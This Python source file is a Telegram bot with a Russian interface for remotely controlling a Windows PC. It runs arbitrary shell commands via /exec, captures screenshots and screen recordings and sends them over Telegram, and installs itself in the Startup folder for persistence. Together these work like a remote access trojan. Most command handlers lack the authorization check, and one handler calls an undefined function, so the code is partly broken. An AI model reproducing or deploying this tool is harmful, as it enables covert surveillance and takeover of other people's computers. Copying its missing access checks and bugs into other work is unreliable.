import cv2
import numpy as np
import os
import ctypes
import subprocess
import time
import pyautogui
import psutil
import requests
import asyncio
import random
import threading
import sys
import shutil
import winreg
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton


API_TOKEN = ''
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)


AUTHORIZED_USERS = []

SELECTED_COMPUTERS = {}

cursor_moving = False
cursor_thread = None


def shutdown():
    os.system('shutdown /s /t 1')


def reboot():
    os.system('shutdown /r /t 1')


def sleep():
    os.system('rundll32.exe powrprof.dll,SetSuspendState 0,1,0')


def wake_up():
    ctypes.windll.user32.SetThreadExecutionState(0x80000002)


def logout():
    os.system('shutdown /l')


def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save('screenshot.png')


def open_cmd():
    os.system('start cmd')


def minimize_all_windows():
    ctypes.windll.user32.keybd_event(0x5B, 0, 0, 0)
    ctypes.windll.user32.keybd_event(0x4D, 0, 0, 0)
    ctypes.windll.user32.keybd_event(0x5B, 0, 2, 0)
    ctypes.windll.user32.keybd_event(0x4D, 0, 2, 0)


def get_system_info():
    cpu_usage = psutil.cpu_percent()
    memory_usage = psutil.virtual_memory().percent
    uptime_seconds = int(psutil.boot_time())
    uptime = str(psutil.boot_time())

    uptime = int(time.time() - uptime_seconds)
    hours, remainder = divmod(uptime, 3600)
    minutes, seconds = divmod(remainder, 60)
    uptime_formatted = f"{hours} ч {minutes} мин {seconds} сек"
    return f"📊 **Информация о системе:**\n\n**CPU:** {cpu_usage}%\n**Память:** {memory_usage}%\n**Аптайм:** {uptime_formatted}"


def get_ip_address():
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        ip_address = response.json().get("ip")
        return f"🌐 **Текущий IP-адрес:** {ip_address}"
    except requests.RequestException:
        return "❌ Не удалось получить IP-адрес."


def list_files(directory):
    try:
        files = os.listdir(directory)
        return "\n".join(files) if files else "Папка пуста."
    except Exception as e:
        return f"❌ Ошибка: {str(e)}"


def play_sound(file_path):
    if os.path.exists(file_path):
        os.system(f'start {file_path}')
    else:
        print(f"Файл {file_path} не найден.")


def set_max_volume():
    try:
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        from comtypes import CLSCTX_ALL
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
    except Exception as e:
        print(f"Ошибка при установке громкости: {e}")


def move_cursor_randomly():
    global cursor_moving
    while cursor_moving:
        x = random.randint(0, pyautogui.size().width)
        y = random.randint(0, pyautogui.size().height)
        pyautogui.moveTo(x, y, duration=0.5)
        time.sleep(1)


def execute_cmd(command):
    try:

        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        return result if result else "Команда выполнена успешно без вывода."
    except subprocess.CalledProcessError as e:
        return f"❌ Ошибка выполнения команды:\n{e.output}"


def add_to_startup():
    try:

        if getattr(sys, 'frozen', False):

            script_path = sys.executable
        else:
            script_path = os.path.abspath(__file__)


        startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        shortcut_path = os.path.join(startup_dir, 'PC_Control_Bot.lnk')


        import win32com.client
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = script_path
        shortcut.WorkingDirectory = os.path.dirname(script_path)
        shortcut.IconLocation = script_path
        shortcut.save()

        print("✅ Скрипт добавлен в автозагрузку.")
    except Exception as e:
        print(f"❌ Не удалось добавить скрипт в автозагрузку: {e}")

def ensure_startup():
    try:
        startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        shortcut_path = os.path.join(startup_dir, 'PC_Control_Bot.lnk')
        if not os.path.exists(shortcut_path):
            add_to_startup()
    except Exception as e:
        print(f"❌ Ошибка при проверке автозагрузки: {e}")


def is_authorized(user_id):
    return user_id in AUTHORIZED_USERS


def list_network_computers():
    try:
        result = subprocess.check_output("net view", shell=True, stderr=subprocess.STDOUT, universal_newlines=False)
        result = result.decode('windows-1251') 
        computers = [line.strip() for line in result.splitlines() if line.strip() and not line.startswith("Список компьютеров")]
        if computers:
            return "\n".join(computers)
        else:
            return "Не удалось найти компьютеры в сети."
    except subprocess.CalledProcessError as e:
        return f"❌ Ошибка при получении списка компьютеров: {e.output}"
    except Exception as e:
        return f"❌ Произошла ошибка: {str(e)}"



def record_screen(video_path="screen_recording.mp4", duration=10, frame_rate=20):
    screen_width, screen_height = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter(video_path, fourcc, frame_rate, (screen_width, screen_height))

    start_time = cv2.getTickCount()
    while True:
        screenshot = pyautogui.screenshot()
        frame = np.array(screenshot)
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)

        out.write(frame)

        elapsed_time = (cv2.getTickCount() - start_time) / cv2.getTickFrequency()
        if elapsed_time >= duration:
            break

    out.release()
    return video_path



def main_menu():
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
    buttons = [
        KeyboardButton('/shutdown'),
        KeyboardButton('/reboot'),
        KeyboardButton('/sleep'),
        KeyboardButton('/wakeup'),
        KeyboardButton('/logout'),
        KeyboardButton('/screenshot'),
        KeyboardButton('/cmd'),
        KeyboardButton('/minimize'),
        KeyboardButton('/system_info'),
        KeyboardButton('/ip_address'),
        KeyboardButton('/list_files'),
        KeyboardButton('/play_sound'),
        KeyboardButton('/move_cursor'),
        KeyboardButton('/stop_cursor'),
        KeyboardButton('/max_volume'),
        KeyboardButton('/exec'),
        KeyboardButton('/network_computers'),
    ]
    keyboard.add(*buttons)
    return keyboard


@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    if not is_authorized(message.from_user.id):
        await message.reply("❌ У вас нет доступа к этому боту.")
        return

    welcome_text = (
        "👋 Привет! Я бот для управления ПК. Вот что я умею:\n\n"
        "🔧 **Команды:**\n"
        "/shutdown - Выключить ПК\n"
        "/reboot - Перезагрузить ПК\n"
        "/sleep - Перевести ПК в режим сна\n"
        "/wakeup - Вывести ПК из режима сна\n"
        "/logout - Выйти из текущей сессии\n"
        "/screenshot - Сделать скриншот\n"
        "/cmd - Запустить командную строку\n"
        "/minimize - Свернуть все окна\n"
        "/system_info - Получить информацию о системе\n"
        "/ip_address - Получить текущий IP-адрес\n"
        "/list_files - Список файлов в директории\n"
        "/play_sound - Проиграть звуковой файл\n"
        "/move_cursor - Начать рандомное перемещение курсора\n"
        "/stop_cursor - Остановить рандомное перемещение курсора\n"
        "/max_volume - Установить громкость на максимум\n"
        "/exec - Выполнить произвольную команду в cmd\n"
        "/show_video - Запись экрана\n"
    )
    await message.reply(welcome_text, reply_markup=main_menu())

@dp.message_handler(commands=['shutdown'])
async def handle_shutdown(message: types.Message):
    shutdown()
    await message.reply("🛑 ПК будет выключен.")


@dp.message_handler(commands=['reboot'])
async def handle_reboot(message: types.Message):
    reboot()
    await message.reply("🔄 ПК будет перезагружен.")


@dp.message_handler(commands=['sleep'])
async def handle_sleep(message: types.Message):
    sleep()
    await message.reply("💤 ПК переведен в режим сна.")


@dp.message_handler(commands=['wakeup'])
async def handle_wakeup(message: types.Message):
    wake_up()
    await message.reply("🔋 ПК выведен из режима сна.")


@dp.message_handler(commands=['logout'])
async def handle_logout(message: types.Message):
    logout()
    await message.reply("🚪 Выход из текущей сессии инициирован.")


@dp.message_handler(commands=['screenshot'])
async def handle_screenshot(message: types.Message):
    try:
        take_screenshot()
        with open('screenshot.png', 'rb') as photo:
            await message.reply_photo(photo, caption="📸 Скриншот экрана.")
        os.remove('screenshot.png')
    except Exception as e:
        await message.reply(f"❌ Ошибка при создании скриншота: {e}")


@dp.message_handler(commands=['cmd'])
async def handle_cmd(message: types.Message):
    open_cmd()
    await message.reply("💻 Командная строка запущена.")


@dp.message_handler(commands=['minimize'])
async def handle_minimize(message: types.Message):
    minimize_all_windows()
    await message.reply("📉 Все окна свернуты.")


@dp.message_handler(commands=['system_info'])
async def handle_system_info(message: types.Message):
    info = get_system_info()
    await message.reply(info, parse_mode='Markdown')


@dp.message_handler(commands=['ip_address'])
async def handle_ip_address(message: types.Message):
    ip_address = get_ip_address()
    await message.reply(ip_address)


@dp.message_handler(commands=['list_files'])
async def handle_list_files(message: types.Message):
    directory = '.'
    files = list_files(directory)
    await message.reply(f"📁 **Список файлов в директории {directory}:**\n{files}", parse_mode='Markdown')


@dp.message_handler(commands=['play_sound'])
async def handle_play_sound(message: types.Message):
    file_path = 'file.wav'
    if os.path.exists(file_path):
        play_sound(file_path)
        await message.reply("🔊 Звуковой файл воспроизведен.")
    else:
        await message.reply("❌ Файл звука не найден.")


@dp.message_handler(commands=['move_cursor'])
async def handle_move_cursor(message: types.Message):
    global cursor_moving, cursor_thread
    if cursor_moving:
        await message.reply("⚠️ Курсор уже перемещается.")
        return

    cursor_moving = True
    cursor_thread = threading.Thread(target=move_cursor_randomly, daemon=True)
    cursor_thread.start()
    await message.reply("🎮 Начато рандомное перемещение курсора.")


@dp.message_handler(commands=['stop_cursor'])
async def handle_stop_cursor(message: types.Message):
    global cursor_moving
    if not cursor_moving:
        await message.reply("⚠️ Курсор не перемещается.")
        return

    cursor_moving = False
    await message.reply("🛑 Рандомное перемещение курсора остановлено.")


@dp.message_handler(commands=['max_volume'])
async def handle_max_volume(message: types.Message):
    try:
        set_max_volume()
        await message.reply("🔊 Громкость установлена на максимум.")
    except Exception as e:
        await message.reply(f"❌ Не удалось установить громкость: {e}")


@dp.message_handler(commands=['exec'])
async def handle_exec(message: types.Message):
    if not is_authorized(message.from_user.id):
        await message.reply("❌ У вас нет доступа к этой команде.")
        return


    command = message.get_args()
    if not command:
        await message.reply("❌ Пожалуйста, укажите команду для выполнения.\nПример: /exec dir")
        return


    output = execute_cmd(command)

    if len(output) > 4000:
        output = output[:4000] + "\n... (Обрезано)"
    await message.reply(f"💻 **Результат выполнения команды:**\n\n{output}\n", parse_mode='Markdown')


@dp.message_handler(commands=['network_computers'])
async def handle_network_computers(message: types.Message):
    if not is_authorized(message.from_user.id):
        await message.reply("❌ У вас нет доступа к этой команде.")
        return

    computers = list_network_computers_ping()
    await message.reply(f"🖥️ **Список доступных компьютеров в сети:**\n{computers}")


@dp.message_handler(commands=['show_video'])
async def handle_show_video(message: types.Message):
    if not is_authorized(message.from_user.id):
        await message.reply("❌ У вас нет доступа к этой команде.")
        return
    
    video_path = record_screen(duration=10) 

    try:
        with open(video_path, 'rb') as video_file:
            await message.reply_video(video_file, caption="🎥 Видео с экрана.")
        
        os.remove(video_path)

    except Exception as e:
        await message.reply(f"❌ Ошибка при создании видео: {e}")


@dp.message_handler(commands=['select_computer'])
async def select_computer(message: types.Message):
    if not is_authorized(message.from_user.id):
        await message.reply("❌ У вас нет доступа к этой команде.")
        return

    computers = list_network_computers()

    if not computers:
        await message.reply("❌ Не удалось найти компьютеры в сети.")
        return

    keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
    for computer in computers.split('\n'):
        keyboard.add(KeyboardButton(computer))

    await message.reply("📡 Пожалуйста, выберите компьютер для управления.", reply_markup=keyboard)



@dp.message_handler(lambda message: message.text not in ['/start', '/shutdown', '/reboot', '/sleep', '/wakeup',
                                                         '/logout', '/screenshot', '/cmd', '/minimize', '/system_info',
                                                         '/ip_address', '/list_files', '/play_sound', '/move_cursor',
                                                         '/stop_cursor', '/max_volume', '/exec', '/select_computer'])
async def handle_computer_selection(message: types.Message):
    user_id = message.from_user.id
    selected_computer = message.text

    SELECTED_COMPUTERS[user_id] = selected_computer
    await message.reply(f"✅ Вы выбрали компьютер: {selected_computer}", reply_markup=main_menu())


if __name__ == '__main__':
    ensure_startup()
    print("✅ Бот запущен и готов к работе.")
    executor.start_polling(dp, skip_updates=True)
